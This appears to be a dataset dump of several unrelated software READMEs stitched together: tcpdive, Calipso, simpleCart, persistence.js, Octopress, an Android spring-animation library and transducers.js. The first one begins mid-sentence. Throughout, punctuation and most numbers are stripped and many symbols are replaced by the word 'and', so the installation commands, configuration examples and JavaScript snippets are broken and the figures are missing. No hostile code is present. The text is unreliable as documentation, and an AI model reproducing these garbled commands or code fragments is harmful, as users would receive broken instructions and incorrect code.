and grep stap and grep tcpdive and grep v grep and awk print  and xargs kill  rpm way to deploy tcpdive in production environment use makerpm sh script and makerpm sh to configure and make rpm package sh script and makerpm sh after installing the rpm a convenient way of usage is available tcpdive start and stop and status we evaluate tcpdive mainly by comparing the usage of system resources with and without it while tcpdive does increase the cpu usage to some degree it has no significant influence on other system resources commonly used functionalities of tcpdive such as transmission loss and retransmission and http processing are enabled in the following tests brief configuration of nginx worker number is set to the number of cpu cores which is  in our testbed http keep alive is disabled for a short connection test  gigabit network cards are used with their tx and rx queues bound httpload running on client fetches a kb file from nginx with different degrees of concurrency to vary the cpu load of server here s a figure to demonstrate the increment of per core cpu usage and the decrement of qps induced by tcpdive under different circumstances lab evaluation image and lab png lab evaluation the figure above shows per core cpu consumption of tcpdive is less than  while qps is no significant influenced which we believe is acceptable in most cases however on condition that per core cpu usage is already very high greater than   the use of tcpdive is not recommended because qps will drop a lot to make room for tcpdive as mentioned before tcpdive has already been deployed in the production environment of sina one typical scenario is using tcpdive on haproxy server which acts as the load balancer of image service the figure below shows the fluctuation of per core cpu usage of a  core server within  hours two  gigabit network cards are used with their tx and rx queues bound online evaluation image and online png online evaluation based on months observation we make a conclusion that tcpdive is stable and robust enough to be deployed in the production environment email zhangskd gmail com if you have any questions please leave a message on my blog or email me

1563595, calipso is a simple nodejs content management system built along similar themes to drupal and wordpress that is designed to be fast flexible and simple for additional details including installation instructions please if you would like to contribute please take a look at the issues list as this will have the most up to date view of work that needs to be done for the next minor release otherwise please just pm myself cliftonc  dennis dennishall or dale dtan and we can suggest some places for you to start if you want to try it out as quickly as possible please install mongodb ensure that you have the right compilers installed for osx xcode will work for ubuntu the build essential and libssl dev packages and then use npm npm install calipso g calipso site and var and www and mysite cd and var and www and mysite calipso server note the server will output an installation password during install to prevent some other person from installing your server the output will look something like this installation password ng and josjsxsrserdxvgkihppyc and w inside quotes this causes the sort api to change in order to run under smartos mongoose had to be upgraded to in turn upgrade mongodb to   x when sorting rather than javascript query sort column   sort column   javascript query sort column column the site will respond to a environment variable called mongouri if mongouri is set then the configuration storage will move from the and conf folder into the mongodb database pointed to by the mongouri this allows easy deployment of a calipso site to a nodejs hosting provider to re install or install calipso will ask for an installation password which is a randomly generated string which will be logged to your log file copy this string and paste it into the ui to proceed the system will overwrite and adjust the username and password your specify for the admin which previously was a little bit of a problem to re install use your mongo command shell to update the settings in the database as follows javascript db confs update environment development  set configuration installed false javascript db confs update environment production  set configuration installed false since node v   has removed code require paths and code  in order to code require  lib and calipso and code  you must include the following to your file javascript var rootpath process cwd and and  path require path  calipso require path join rootpath lib and calipso that also goes for including anything that is based on the root path of the project directory to get running in development mode not the site mode outlined on the front page e g so you can make changes to core and submit pull requests  fork the repository  clone from your fork replace yourname git clone git github com yourname and calipso git  run npm install d in the clone folder to install all of the dependencies  run node app to run calipso from the source folder note that the bin and calipso command line script is really designed to allow people who just want to use calipso to build sites to use it it isn t used in the dev process as always any questions please do shout the commands currently supported from the command line client are calipso show this help file calipso site name and folder create site in folder the most important of these at the moment is  modules check this will ensure

basic html copyright c  brett wejrowski dual licensed under the mit or gpl licenses if you would like to use an older version you can use a different branch or see them in the downloads area v   changelog moved beforecheckout event and form sending inside of checkout to keep dry added price shipping tax formatting for paypal checkout added submit method to element fixed mootools get and live bugs to get started just add the simplecart javascript file to your page and set your paypal checkout script simplecart checkout type paypal  email you yours com and script if you want to change options like the tax or currency you can do that as well simplecart checkout type paypal  email you yours com tax   currency eur to sell items you add them to your shelf by simply adding a few classes to your html h class itemname awesome t shirt and h input type text value  class itemquantity span class itemprice   and span you can use almost any type of html tag and set any values for the item you want by adding a class of item attrname here is a more complex item with options and images h class itemname awesome t shirt and h select class itemsize option value small small and option option value medium medium and option option value large large and option and select input type text value  class itemquantity span class itemprice   and span please check out our documentation to see all of the options simplecart has available a work in progress i m putting it here until we have the new site up so i can put it well there simplecart js requires using jquery prototype or mootools no extra configuration is needed as long as one of those libraries is included on the page you can set and change simplecart options at any time simplecart option value  option value here are the possible options and their default values simplecart and and array representing the format and columns of the cart see and and the cart columns documentation cartcolumns attr name  label name  attr price  label price  view currency  view decrement  label false  attr quantity  label qty  view increment  label false  attr total  label subtotal  view currency  view remove  text remove  label false and and div or table builds the cart as a table or collection of divs cartstyle div  and and how simplecart should checkout see the checkout reference for more info checkout type paypal  email you yours com and and set the currency see the currency reference for more info currency usd  and and collection of arbitrary data you may want to store with the cart and and such as customer info data  and and set

your users by simple using class names in your html for any item you want to be available to be added to the cart you make a container with a class name of simplecartshelfitem then add classes to tags inside of that container that have the general form item name of field and simplecart will use the value or innerhtml of that tag for the cart for example if you wanted to sell a t shirt with  different sizes you can do this h class itemname awesome t shirt and h select class itemsize option value small small and option option value medium medium and option option value large large and option and select input type text value  class itemquantity span class itemprice   and span notice here that you can use a select to change options for the item when you add it to the cart you can also use a text input to change the quantity or any other field these classes will work with any tag so feel free to use what works best for you finally notice that a tag with the class itemadd will have an event listener on its click so when the contents of that tag are clicked an item will be added to the cart with the values of each of the tags in the container with the itemsomething class you will want to always supply a quantity and price although the cart won t break if you don t all the quantities and totals are created from it so the cart will assign a price of  if there is none and a quantity of  if no quantity is provided if you are planning on checking out to googlecheckout or paypal it is a good idea to use a name field if you use a link for the add to cart button its a good idea to set the href to javascript the cart columns allow the user to specify how the cart will be formatted and displayed there is a lot of flexibility here take a look at the default setup simplecart cartcolumns attr name  label name  attr price  label price  view currency  view decrement  label false  text  attr quantity  label qty  view increment  label false  text and  attr total  label subtotal  view currency  view remove  text remove  label false each column is represented by an object the most basic setup simple specifies which attribute to display and how to label the column attr name  label name there are also some built in views that will create a special column for example an increment view view increment  label false  text and will have a link that increments the quantity setting the label false will hide the label for the view you can specify the text of the link with that text attribute you can add view currency to format the column as currency see the currency section on more information on currency formatting for more information please go to simplecartjs com

497608, persistence js  persistence js is a asynchronous javascript object relational mapper library it can be used both in the web browser and on supports  types of data stores somewhat controversial part of html that is supported in webkit browsers specifically on mobile devices including iphone android and palm s webos a number of feature to the browser including a in browser database on the server in memory as a fallback keeps the database in memory and is cleaned upon a page refresh or server restart  unless saved to there is also an experimental support for qt   declarative ui framework is an extension to javascript for browser use persistence js has no dependencies on any other frameworks other than the google gears initialization want to enable gears support there are a few persistence js plug ins available that add functionality persistence search js  adds simple full text search capabilities see docs and search md for more information persistence migrations js  supports data migrations changes to the database schema  see docs and migrations md for more information persistence sync js  supports database synchronization with a remote server see docs and sync md for more information jquery persistence js  adds jquery integration including jquery mobile ajax request interception and re routing to persistencejs see docs and jquery md for more information and demo and jquerymobile for a simple demo a brief intro to async programming  in browsers javascript and the web page s rendering engine share a single thread the result of this is that only one thing can happen at a time if a database query would be performed synchronously like in many other programming environments like java and php the browser would freeze from the moment the query was issued until the results came back therefore many apis in javascript are defined as asynchronous apis which mean that they do not block when an expensive computation is performed but instead provide the call with a function that will be invoked once the result is known in the meantime the browser can perform other duties for instance a synchronous database call call would look as follows var results db query select from table for the execution of the first statement could take half a second during which the browser doesn t do anything else by contrast the asynchronous version looks as follows db query select from table  function results for note that there will be a delay between the db query call and the result being available and that while the database is processing the query the execution of the javascript continues to make this clear consider the following program db query select from table  function results console log hello console log world although one could assume this would print hello  followed by world  the result will likely be that world is printed before hello  because hello is only printed when the results from the query are available this is a tricky thing about asynchronous programming that a javascript developer will have to get used to using persistence js in the browser  browser support  modern webkit browsers google chrome and safari firefox through google gears android browser tested on   and  x iphone browser iphone os  and palm webos tested on    other browsers supporting localstorage e g firefox the following is being worked on internet explorer is likely not supported untested because it lacks definegetter and definesetter support which persistence js uses heavily this may change in ie  setting up  using bower bower install persistence add a script to your index html lib and persistence js needs to be added as well as any data stores you want to use note that the mysql and websql stores both depend on the sql store a typical setup requires you to add at least lib and persistence js  lib and persistence store sql js and lib and persistence store websql js as follows if you want to use the in memory store in combination with localstorage you also need the persistence store memory js included using directly from source git clone git and and github com and zefhemel and persistencejs git copy directories you will need following almost the same instructions above setup your database  you need to explicitly configure the data store you want to use configuration of the data store is store specific the websql store which includes google gears support is configured as follows persistence store websql config persistence yourdbname  a database description     the first argument is always supposed to be persistence the second in your database name it will create it if it does not already exist the third is a description for you database the last argument is the maximum size of your database in bytes mb in this example persistence store cordovasql config persistence yourdbname      and and db version my database  and and db display name    and and db size websql fallback only  and and sqliteplugin background processing disabled  and and db location ios only   default documents  library  library and localdatabase and and  itunes and icloud  no itunes and icloud  no itunes and no icloud please note that to use cordova store you must use the master branch because it is not included up to release v   the in memory store  the in memory store is offered as a fallback for browsers that do not support any of the other supported stores e g websql or gears in principal it only keeps data in memory which means that navigating away from the page including a reload or tab close will result in the loss of all data a way around this is using the persistence savetolocalstorage and persistence loadfromlocalstorage functions that can save the entire is persisted indefinitely similar to websql if you re going to use the in memory store you can configure it as follows persistence store memory config persistence then if desired current data can be loaded from the localstorage using persistence loadfromlocalstorage function alert all data loaded and saved using persistence savetolocalstorage function alert all data saved drawbacks of the in memory store performance all actions that are typically performed by a database sorting filtering  are now all performed in memory using javascript limited database size loading and saving requires serialization of all data from and to json which gets more expensive as your dataset grows most browsers have a maximum size of mb for localstorage synchronous behavior although the api is asynchronous all persistence actions will be performed synchronously on the main javascript thread which may make the browser less responsive schema definition  a data model is declared using persistence define the following two definitions define a task and category entity with a few simple properties the property types are based on sqlite types are but any sqlite type is supported text for textual data int for numeric values bool for boolean values true or false date for date and time value with precision of  second json a special type that can be used to store arbitrary to filter or sort in any sensible way if internal changes are made to a json property persistence js may not register them therefore a manual call to anobj markdirty jsonpropertyname is required before calling persistence flush example use var task persistence define task  name text  description text  done bool var category persistence define category  name text  metadata json var tag persistence define tag  name text the returned values are constructor functions and can be used to create new instances of these entities later it is possible to create indexes on one or more columns using entityname index  for instance task index done task index done  name these indexes can also be used to impose unique constraints task index done  name  unique true relationships between entities are defined using the constructor function s hasmany call and and this defines a one to many relationship category hasmany tasks  task category and and these two definitions define a many to many relationship task hasmany tags  tag tasks tag hasmany tasks  task tags the first statement defines a tasks relationship on category objects containing a querycollection see the section on query collections later of task s it also defines an inverse relationship on task objects with the name category the last two statements define a many to many relationships between task and tag task gets a tags property a querycollection containing all its tags and vice versa tag gets a tasks property containing all of its tasks the defined entity definitions are synchronized activated with the database using a persistence schemasync call which takes a callback function with a newly created transaction as an argument  that is called when the schema synchronization has completed the callback is optional persistence schemasync and and or persistence schemasync function tx and and tx is the transaction object of the transaction that was and and automatically started there is also a migrations plugin you can check out documentation can be found in docs and migrations md docs and migrations md file you can also define mix ins and apply them to entities of the model a mix in definition is similar to an entity definition except using definemixin rather than just define for example var annotatable persistence definemixin annotatable  lastannotated date you can define relationships between mix in and entities for example and and a normal entity var note persistence define note  text text and and relationship between a mix in and a normal entity annotatable hasmany notes  note annotated once you have defined a mix in you can apply it to any entity of your model with the entity is mixin method for example project is annotatable task is annotatable now your project and task entities have an additional lastannotated property they also have a one to many relationship called notes to the note entity and you can also traverse the reverse relationship from a note to its annotated object note that annotated is a polymorphic relationship as it may yield either a project or a task or any other entity which is annotatable note prefetch is not allowed yet on a relationship that targets a mixin in the example above you cannot prefetch the annotated relationship when querying the note entity notes this feature is very experimental at this stage it needs more testing support for is a relationships classical inheritance is also in the works creating and manipulating objects  new objects can be instantiated with the constructor functions optionally an object with initial property values can be passed as well or the properties may be set later var task new task var category new category name my category category metadata rating  var tag new tag tag name work many to one relationships are accessed using their specified name e g task category category one to many and many to many relationships are access and manipulated through the querycollection api that will be discussed later task tags add tag tasks tags remove tag tasks tags list tx function alltags console log alltags persisting and removing objects  uses a tracking mechanism to determine which objects changes have to be persisted to the database all objects retrieved from the database are automatically tracked for changes new entities can be tracked to be persisted using the persistence add function var c new category name main category persistence add c for var i  i  i and and var t new task t name task and i t done i   t category c persistence add t objects can also be removed from the database persistence remove c all changes made to tracked objects can be flushed to the database by using persistence flush  which takes a transaction object and callback function as arguments a new transaction can be started using persistence transaction persistence transaction function tx persistence flush tx function alert done flushing  for convenience it is also possible to not specify a transaction or callback in that case a new transaction will be started automatically for instance persistence flush and and or with callback persistence flush function alert done flushing note that when no callback is defined the flushing still happens asynchronously important changes and new objects will not be persisted until you explicitly call persistence flush the exception to this rule is using the list method on a database querycollection  which also flushes first although this behavior may change in the future dumping and restoring data  the library supports two kinds of dumping and restoring data persistence dump can be used to create an object containing a full dump of a database naturally it is adviced to only do this with smaller databases example persistence dump tx task category  function dump console log dump the tx is left out a new transaction will be started for the operation if the second argument is left out dump defaults to dumping all defined entities the dump format is entity name list of instances   persistence load is used to restore the dump produced by persistence dump usage persistence load tx dumpobj function alert dump restored the tx argument can be left out to automatically start a new transaction note that persistence load does not empty the database first it simply attempts to add all objects to the database if objects with e g the same id already exist this will fail similarly persistence loadfromjson and persistence dumptojson respectively load and dump all the database s data as json strings entity constructor functions  the constructor function returned by a persistence define call cannot only be used to instantiate new objects it also has some useful methods of its own entityname all session returns a query collection containing persisted instances of that object the session argument is optional and only required when persistence js is used in multi session mode entityname load session  tx  id callback loads an particular object from the database by id or returns null if it has not been entityname findby session  tx  property value callback searches for a particular object based on a property value this is assumed to be unique  the callback function is called with the found object or null if it has not been found entityname index col col  coln  options creates an index on a column of a combination of columns for faster searching if options unique is true the index will impose a unique constraint on the values of the columns and of course the methods to define relationships to other entities entityname hasmany property entity inverseproperty defines a  n or n m relationship depending on the inverse property entityname hasone property entity defines a   or n  relationship entity objects  entity instances also have a few predefined properties and methods you should be aware of obj id  contains the identifier of your entity this is a automatically generated approximation of a uuid you should never write to this property obj fetch prop callback  if an object has a hasone relationship to another which has not yet been fetched from the database e g when prefetch wasn t used  you can fetch in manually using fetch when the property object is retrieved the callback function is invoked with the result the result is also cached in the entity object itself obj selectjson tx  propertyspec callback  sometime you need to extract a subset of data from an entity you for instance need to post a json representation of your entity but do not want to include all properties selectjson allows you to do that the propertyspec arguments expects an array with property names some examples id  name  will return an object with the id and name property of this entity  will return an object with all the properties of this entity not recursive project name  will return an object with a project property which has a name property containing the project name hasone relationship project id name  will return an object with a project property which has an id and name property containing the project name hasone relationship tags name  will return an object with an array tags property containing objects each with a single property name query collections  a core concept of persistence js is the querycollection a querycollection represents a sometimes virtual collection that can be filtered ordered or paginated querycollection s are somewhate inspired by google appengine s query a querycollection has the following methods filter property operator value returns a new querycollection that adds a filter filtering a certain property based on an operator and value supported operators are       in and not in example filter done   true or filter returns a new querycollection that contains items either matching the filters specified before calling or  or the filter represented in the argument the filter argument is of a filter type there are three types of filters persistence propertyfilter  which filters on properties internally called when filter is used example new persistence propertyfilter done   true persistence andfilter  which is passed two filter objects as arguments both of which should be true example new persistence andfilter new persistence propertyfilter done   true  new persistence propertyfilter archived   true persistence orfilter  which is passed two filter objects as arguments one of which should be true example new persistence orfilter new persistence propertyfilter done   true  new persistence propertyfilter archived   true and filter same as or filter except that both conditions should hold for items to be in the collection order property ascending returns a new querycollection that will order its results by the property specified in either an ascending ascending true or descending ascending false order limit n returns a new querycollection that limits the size of the result set to n items useful for pagination skip n returns a new querycollection that skips the first n results useful for pagination prefetch rel returns a new querycollection that prefetches entities linked through relationship rel  note that this only works for one to one and many to one relationships add obj adds object obj to the collection remove obj removes object obj from the collection list tx  callback asynchronously fetches the results matching the formulated query once retrieved the callback function is invoked with an array of entity objects as argument each tx  eachcallback asynchronously fetches the results matching the formulated query once retrieved the eachcallback function is invoked on each element of the result objects foreach tx  eachcallback alias for each one tx  callback asynchronously fetches the first element of the collection or null if none destroyall tx  callback asynchronously removes all the items in the collection important this does not only remove the items from the collection but removes the items themselves count tx  callback asynchronously counts the number of items in the collection the arguments passed to the callback function is the number of items query collections are returned by entityname all  e g task all one to many and many to many relationships e g task tags var alltasks task all filter done   true prefetch category order name  false limit  alltasks list null function results results foreach function r console log r name window task r  using persistence js on the server  npm install persistencejs sadly the node js server environment requires slight changes to persistence js to make it work with multiple database connections a session object needs to be passed as an extra argument to certain method calls typically as a first argument methods previously called on the persistence object itself are now called on the session object an example node js application is included in test and node blog js you need to require two modules the persistence js library itself and the mysql backend module var persistence require persistencejs var persistencestore persistence storeconfig init persistence adaptor mysql then you configure the database settings to use persistencestore config persistence localhost   dbname  username  password subsequently for every connection you handle assuming you re building a sever  you call the persistencestore getsession var session persistencestore getsession this session is what you pass around typically together with a transaction object note that currently you can only have one transaction open per session and transactions cannot be nested session transaction function tx  commit and rollback  persistence js works in autocommit mode by default you can override this behavior and enable explicit commit and rollback by passing true as first argument to persistence transaction you can then use the following two methods to control the transaction transaction commit session callback commits the changes transaction rollback session callback rollbacks the changes typical code will look like session transaction true function tx and and create and update and delete objects modifythings session tx function err result if err and and something went wrong tx rollback session function console log changes have been rolled back and ex message   else and and success tx commit session function console log changes have been committed result   explicit commit and rollback is only supported on mysql server side defining your data model  defining your data model is done in exactly the same way as regular persistence js var task persistence define task  name text  description text  done bool a schemasync is typically performed as follows session schemasync tx function  creating and manipulating objects  creating and manipulating objects is done much the same way as with regular persistence js  except that in the entity s constructor you need to reference the session again var t new task session session add t session flush tx function  query collections  query collections work the same way as in regular persistence js with the exception of the entity all method that now also requires a session to be passed to it task all session filter done   true list tx function tasks  closing the session  after usage you need to close your session session close bugs and contributions  if you find a bug please report project fix the problem and send me a pull request for a list of planned features and open issues have a look at the issue for support and discussion please join the persistence js google thanks goes to the people listed in authors for their

14474326, octopress is an obsessively designed toolkit for writing and deploying jekyll blogs pretty sweet huh install octopress manually gem install octopress gem octopress    and then run bundle new to bundler run gem install bundler then create a file named gemfile in your site s root directory with the following content gem octopress    run bundle to install the gems specified in your gemfile octopress reads its configurations from config yml here s what the configuration looks like by default postext markdown pageext html postlayout post pagelayout page titlecase true posttemplate post pagetemplate page drafttemplate draft here are the subcommands for octopress init path adds octopress scaffolding to your site new path like jekyll new and octopress init new post title add a new post to your site new page path add a new page to your site new draft title add a new draft post to your site publish post publish a draft from drafts to posts unpublish post search for a post and convert it into a draft isolate post stash all posts but the one you re working on for a faster build integrate restores all posts doing the opposite of the isolate command deploy deploy your site via s rsync or to github pages run octopress help to list sub commands and octopress subcommand help to learn more about any subcommand and see its options octopress init path options this will copy octopress s scaffolding into the specified directory use the force option to overwrite existing files the scaffolding is pretty simple templates and this automates the creation of a new post octopress new post my title this will create a new file at posts and yyyy mm dd my title markdown with the following yaml front matter already added layout post title my title date yyyy mm ddthh mm ss   and option and description and and and and and slug slug and slug for the new post and and dir dir and create post at posts and dir and and and force and overwrite existing file and creating a new page is easy you can use the default file name extension html  pass a specific extension or end with a and to create an index html document octopress new page some page and some page html octopress new page about md and about md octopress new page docs and and docs and index html if you are working with collections you might add a page like this octopress new page legal and terms and legal and terms html after the page is created octopress will tell you how to configure this new collection and option and description and and and and and title title and the title of the new page and and force and overwrite existing file and note the default page template doesn t expect a date if you want to add dates to your pages consider adding date date to the default template templates and page  or create a new template to use for dated pages otherwise you will have the date option to add a date to a page this will create a new post in your drafts directory octopress new draft my title and option and description and and and and and slug slug and the slug for the new post and and force and overwrite existing file and use the publish command to publish a draft to the posts folder this will also rename the file with the proper date format octopress publish drafts and some cool post md octopress publish cool in the first example a draft is published using the path the publish command can also search for a post by filename the second command would work the same as the first if other drafts match your search you will be prompted to select them from a menu this is often much faster than typing out the full path and option and description and and and and and slug slug and change the slug for the new post and and dir dir and create post at posts and dir and and and force and overwrite existing file and when publishing a draft the new post will use the draft s date pass the option date now to the publish command to set the new post date from your system clock as usual you can pass any compatible date string as well use the unpublish command to move a post to the drafts directory renaming the file according to the drafts convention octopress unpublish posts and    some post md octopress unpublish some post just like the publish command you can either pass a path or a search string to match the file name if more than one match is found you will be prompted to select from a menu of posts octopress post and page templates look like this layout layout title title dates get automatically added to a template for posts and for pages if a date option is set you can add to the yaml front matter add content below and even use liquid tags and filters from your site s plugins there are a handful of local variables you can use when working with templates and variable and description and and and and and date and the date if set or time now iso and and title and the title of the page if set and and slug and the title in slug form and and ymd and the date string yyyy mm dd format and and year and the date s year and and month and the date s month mm and and day and the date s day dd and by default octopress has templates for pages posts and drafts you can change them or create new ones for different types of content to create linkposts template add a file at templates and linkpost  such as title title external url url then you can use it with a new post like this octopress new post some title template linkpost octopress new post some title tm templates and linkpost in the second example i m passing the full template file path this way i can use my shell s tab to auto complete feature when creating templates file name extensions are unnecessary since the files are just plain text anyway the isolate command will allow you to stash posts in posts and exile where they will be ignored by jekyll during the build process run octopress integrate to restore all exiled posts this can be helpful if you have a very large site and you want to quickly preview a build for a single post or page octopress isolate move all posts octopress isolate posts and    kittens md move post at path octopress isolate kittens move post matching search in the third example if multiple posts match the search a prompt will ask you to select a post from a menu once you ve built your site with jekyll build you can deploy it like this octopress deploy this reads a deploy yml configuration and deploys your site read below to learn how octopress can generate a deployment configuration file for you note the deploy yml is processed through erb which makes it easy to load configurations from environment variables deploy has a few commands you should know and commands and description and and and and and octopress deploy and deploy your site based on the deploy yml configuration and and octopress deploy init method options and generate a config file for the deployment method git s rsync and and octopress deploy pull dir and pull down your site into a local directory and and octopress deploy add bucket name and s only add a bucket using your configured s credentials and remember to add your configuration to gitignore to be sure you never commit sensitive information to your repository octopress can generate a deployment configuration file for you using the octopress deploy init command octopress deploy init s octopress deploy init rsync octopress deploy init git git github com user and project this will generate a deploy yml file in your current directory which you can edit to add any necessary configuration if you like you can pass configurations as command line options to see specific options for any method add the help flag for example to see the options for configuring s octopress deploy init s help if you want to publish your site to a staging server you can create a second configuration for example to setup rsync for a staging site you d do this octopress deploy init rsync config staging yml after modifying the configuration file you can deploy your site to it like this octopress deploy config staging yml only giturl is required other options will default as shown below and config and description and default and and and and and method and deployment method in this case use git and and and sitedir and path to static site files and site and and giturl and url for remote git repository and and and gitbranch and deployment branch for git repository and master and and deploydir and directory where deployment files are staged and deploy and and remote and name of git remote and deploy and and config and description and default and and and and and method and deployment method in this case use rsync and and and sitedir and path to static site files and site and and user and ssh user e g user host com and and and port and ssh port and  and and remotepath and remote destination s document root and and and excludefrom and path to a file containing rsync exclusions and and and exclude and inline list of rsync exclusions and and and includefrom and path to a file containing rsync inclusions and and and include and inline list of inclusions to override exclusions and and and delete and delete files in destination not found in source and false and you can rsync to a local directory by configuring remotepath and leaving off user and port important when using s you must add your deploy yml to your gitignore to prevent accidentally sharing account access information and config and description and default and and and and and method and deployment method in this case use s and and and sitedir and path to static site files and site and and bucketname and s bucket name and and and accesskeyid and aws access key and and and secretaccesskey and aws secret key and and and distributionid and optional aws cloudfront distribution id and and and remotepath and directory files should be synced to and and and and verbose and optional display all file actions during deploy and false and and incremental and optional incremental deploy only updated files and false and and region and optional region for your aws bucket and us east  and and delete and delete files in remotepath not found in sitedir and false and and headers and set headers for matched files and and if you choose a bucket which doesn t yet exist octopress deploy will offer to create it for you and offer to configure it as a static website if you configure octopress to delete files all files found in the remotepath on s bucket will be removed unless they match local site files if remotepath is a subdirectory only files in that subdirectory will be evaluated for deletion you can also set up your configuration to read your aws credentials from your environment variables using erb like this accesskeyid env awsaccesskey secretaccesskey env awssecretkey you can create an array of header configs to set expiration content and cache settings for any paths matching the filename and header config and description and default and and and and and filename and a regex or a substring of the file to match and and and sitedir and an http date or a number of years or days from now and and and contenttype and a string which is passed through to the headers and and and contentencoding and a string which is passed through to the headers and and and cachecontrol and a string which is passed through to the headers and and here is how you might set expiration and cache controls for css and javascript files filename assets js expires and  years cachecontrol max age  contenttype application and javascript filename assets css expires and  years cachecontrol max age  contenttype text and css if you prefer you can store aws access credentials in environment variables instead of a configuration file and config and env var and and and and and accesskeyid and awsaccesskeyid and and secretaccesskey and awssecretaccesskey and note configurations in deploy yml will override environment variables so be sure to remove those if you decide to use environment variables with the pull command you can pull your site down into a local directory octopress deploy pull dir mainly you d do this if you re troubleshooting deployment and you want to see if it s working how you expected  create your feature branch git checkout b my new feature  commit your changes git commit am add some feature  push to the branch git push origin my new feature  create new pull request

common use cases actions such as motionevents  are mapped to springs via imitators springs are mapped to views and view properties via performers in addition an actor wraps the above objects and provides a simple interface for mapping touch motion to a view s position dragging a performer takes the current value of a spring and sets it as the value of a view property spring bounce springsystem create createspring performer xmotion new performer view view translationx bounce addlistener xmotion spring bounce springsystem create createspring addlistener new performer view view translationx an imitator constantly perturbs the spring it is attached to this perturbation can originate a variety of sources  a motionevent  where the spring can change based on the action actiondown  actionup  or imitate a property x  y  etc these are called eventimitators  another spring  which leads to results similar to springs being chained together these are called springimitators an eventimitator primarily operates with ontouchlisteners the simplest example is a toggleimitator  which toggles between two different values depending on the touch state view setontouchlistener new toggleimitator spring   when the user touches the view a value of  is set on the spring and when the user releases a value of  is set a motionimitator is a special type of eventimitator that maps x and y movement to a spring this is done with motionproperty enums which specifies which methods to call in a motionevent object for example motionproperty x getvalue motionevent calls event getx it also specifies the view property to animate motionevent x getviewproperty corresponds to view translationx this is useful for the actor builder later on in addition tracking and following strategies allow for customization of how the event value is mapped to the spring two tracking strategies are available to configure how an imitator tracks its imitatee trackabsolute maps the imitatee value directly to the spring trackdelta maps the change in the imitatee value relative to the initial touch to the spring two follow strategies are available to configure how the spring is updated followexact maps the imitatee value directly to the current and end value of the spring followspring maps the imitatee value to the end value of the spring which allows the spring to overshoot the current position a springimitator is also a springlistener when the spring it is imitating updates it updates the end value of the spring it is controlling usage is simple springsystem springsystem

reduces a significant amount of boilerplate code the actor class further simplifes view motion by connecting each component together it also manages a view ontouchlistener a motionlistener  which it attaches to the view automatically this can be disabled here is how to create one actor actor new actor builder springsystem create  view addtranslatemotion motionproperty x build in two dimensions actor actor new actor builder springsystem create  view addtranslatemotion motionproperty x addtranslatemotion motionproperty y build two calls to addtranslatemotion motionproperty are needed because each axis is independent of the other the builder will create an ontouchlistener and attach it to the view  as well as a spring with the default settings a performer is also created and attached to the spring when there is a touch event it is passed to the motionimitator  which perturbs the spring which moves the view it is also possible to supply your own springsystem  spring  motionimitator and performer  and the builder will properly connect them the first example above can also be expressed as springsystem springsystem springsystem create spring spring springsystem createspring actor verbose new actor builder springsystem view addmotion spring new motionimitator spring motionproperty x  new performer view view translationx build the view can be also left out of the constructor of the performer and the spring out of the motionimitator using the default springconfig  since the builder will connect them actor walk new actor builder springsystem create  walker addmotion new motionimitator motionproperty x  new performer view translationx build which can be further simplified to actor run new actor builder springsystem create  runner addmotion motionproperty x view translationx build and for more sugar the previous case actor bolt new actor builder springsystem create  bolter addtranslatemotion motionproperty x build requestdisallowtouchevent causes the actor to call viewparent requestdisallowtouchevent true which is helpful when the view is inside a listview or another view that captures touch events dontattachmotionlistener tells the builder to not attach the motionlistener to the view  which is useful when you want to attach your own ontouchlistener to the view eric leong mailto ericleong tumblr com copyright   tumblr inc licensed under the apache

24201496, npm install transducers js for browsers grab the file dist and transducers js when writing programs we frequently write methods that take in collections do something with them and return a result the problem is that we frequently only write these functions to work a specific data structure so if we ever change our data type or wanted to reuse that functionality you can t we need to decouple these kinds of concerns var transform compose map x x   filter x x    take  seq       transform and and   function nums var i  while true yield i and and into  transform nums and and   into  transform immutable list of      and and   the following transformations are available and there are more to come like partition map coll  f ctx mdash call f on each item filter coll  f ctx mdash only include the items where the result of calling f with the item is truthy remove coll  f ctx mdash only include the items where the result of calling f with the item is falsy keep coll mdash remove all items that are null or undefined take coll  n mdash grab only the first n items takewhile coll  f ctx mdash grab only the first items where the result of calling f with the item is truthy drop coll  n mdash drop the first n items and only include the rest dropwhile coll  f ctx mdash drop the first items where the result of calling f with the item is truthy dedupe coll mdash remove consecutive duplicates equality compared with the above functions optionally take a collection to immediately perform the transformation on and a context to bind this to when calling f that means you can call them in four ways immediately perform a map map     x x and  same as above but call the function with this as ctx map     function x return x and   ctx make a map transducer map x x and  same as above but with this as ctx map function x return x and   ctx i will be using the es fat arrow syntax but if that s not available just function instead the signature of running an immediate map is the same familiar one as seen in lodash and underscore but now you can drop the collection to make a transducer and run multiple transformations with good performance var transform compose map x x and   filter x x    take  there are also  transducers available for taking collections and catting them into the transformation stream cat mdash take collections and forward each item individually essentially flattening it mapcat f mdash same as cat  but first apply f to each collection just pass cat straight through like so compose filter x x length   cat that would take all arrays with a length less than  and flatten them out into a single array building data structure agnostic transformations is cool but how do you actually use them transducers js provides several integration points to use a transformation we need to know how to iterate over the source data structure and how to build up a new one the former is easy we can work with arrays objects and anything can uses the es iterator protocol maps sets generators etc all the the below functions works with them for the latter you need to specify what you want back the following functions allow you to make a new data structure and possibly apply a transformation toarray coll xform mdash turn coll into an array applying the transformation xform to each item if provided the transform is optional in case you want to do something like turn an iterator into an array toobj coll xform mdash turn coll into an object if possible applying the transformation xform if provided when an object is iterated it produces two element arrays key value  and obj will turn these back into an object toiter coll xform mdash make an iterator over coll  and apply the transformation xform to each value if specified note that coll can just be another iterator transformations will be applied lazily seq coll xform mdash a generalized method that will return the same data type that was passed in as coll  with xform applied you will usually use this unless you know you want an array object or iterator if coll is an iterator another iterator will be returned and transformations will be applied lazily into to xform from mdash apply xform to each item in from and append it to to this has the effect of pouring elements into to you will commonly use this when converting one type of object to another transduce coll xform reducer init mdash like reduce  but apply xform to each value before passing to reducer if init is not specify it will attempt to get it from reducer the possibilities are endless and and map an object seq foo  bar   map kv kv   kv  and  and and foo  bar  and and make an array from an object toarray foo  bar  and and foo    bar   and and make an array from an iterable function nums var i  while true yield i and and into  take   nums and and    and and lazily transform an iterable var iter seq nums  compose map x x   filter x x  iter next value and and  iter next value and and  iter next value and and  transducers remove the requirement of being lazy to optimize for things like take  however it can still be useful to bind a collection to a set of transformations and pass it around without actually evaluating the transformations as noted above whenever you apply transformations to an iterator it does so lazily it s easy convert array transformations into a lazy operation just use the utility function iterator to grab an iterator of the array instead seq iterator     compose map x x and   filter x x   and and iterator our transformations are completely blind to the fact that our transformations may or may not be lazy this library provides a few small utility functions iterator coll mdash get an iterator for coll  which can be any type like array object iterator or custom data type push arr value mdash push value onto arr and return 